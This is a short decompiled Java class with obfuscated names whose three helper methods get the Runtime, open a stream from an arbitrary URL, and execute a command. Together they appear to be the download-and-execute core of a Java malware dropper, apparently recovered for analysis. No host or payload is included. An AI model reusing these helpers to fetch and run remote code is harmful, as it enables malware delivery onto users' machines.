import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class ggs
{
    public static Runtime jjdR() {
        return Runtime.getRuntime();
    }
    
    public static InputStream EEGD(final String sdhds) throws Exception {
        final URL url = new URL(sdhds);
        try {
            url.openConnection();
        }
        catch (Exception ex) {}
        return url.openStream();
    }
    
    public static void hsdwww(final String fn) throws Exception {
        final Process dexa = jjdR().exec(fn);
        dexa.waitFor();
    }
}
